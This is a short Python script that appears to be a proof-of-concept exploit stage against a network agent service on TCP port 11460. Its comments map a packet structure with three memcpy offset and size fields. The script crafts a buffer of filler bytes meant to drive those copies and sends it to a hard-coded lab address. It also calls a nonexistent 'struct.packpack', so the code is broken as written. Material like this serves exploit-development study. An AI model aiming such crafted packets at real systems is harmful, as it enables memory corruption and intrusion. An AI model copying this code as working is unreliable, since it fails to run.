#!/usr/bin/env python3

import socket
import sys
import struct

# 0x00 - 0x04: Checksum DWORD (Data size, big endian).
# 0x04 - 0x34: psAgentCommand
# - 0x14: Offset for 1st copy operation
# - 0x18: Size of 1st copy operation
# - 0x1C: Offset for 2nd copy operation
# - 0x20: Size of 2nd copy operation
# - 0x24: Offset for 3rd copy operation
# - 0x28: Size of 3rd copy operation
# - 0x2C -> 0x30: Not used
# 0x34 - End:  psCommandBuffer
#   - 0x34 + offset1 -> 0x34 + offset1 + size1: 1st buffer
#   - 0x34 + offset2 -> 0x34 + offset2 + size2: 2nd buffer
#   - 0x34 + offset3 -> 0x34 + offset3 + size3: 3rd buffer

# struct PACKET {
#   int32 data_size;
#   struct psAgentCommand {
#     int8 data[0x10];
#     int32 copy_a_offset;
#     int32 copy_a_size;
#     int32 copy_b_offset;
#     int32 copy_b_size;
#     int32 copy_c_offset;
#     int32 copy_c_size;
#     int8 more_data[0x08];
#   }
#   int8 psCommandBuffer[???];
# }

# Checksum
buf = struct.pack(">i", 0x630)
# psAgentCommand
buf += bytearray([0x41]*0x10)
buf += struct.packpack("<i", 0x0)    # 1st memcpy: offset
buf += struct.packpack("<i", 0x100)  # 1st memcpy: size field
buf += struct.packpack("<i", 0x100)  # 2nd memcpy: offset
buf += struct.packpack("<i", 0x200)  # 2nd memcpy: size field
buf += struct.packpack("<i", 0x300)  # 3rd memcpy: offset
buf += struct.packpack("<i", 0x300)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += bytearray([0x42]*0x100) # 1st buffer
buf += bytearray([0x43]*0x200) # 2nd buffer
buf += bytearray([0x44]*0x300) # 3rd buffer


def main():
    if len(sys.argv) != 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]

    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()
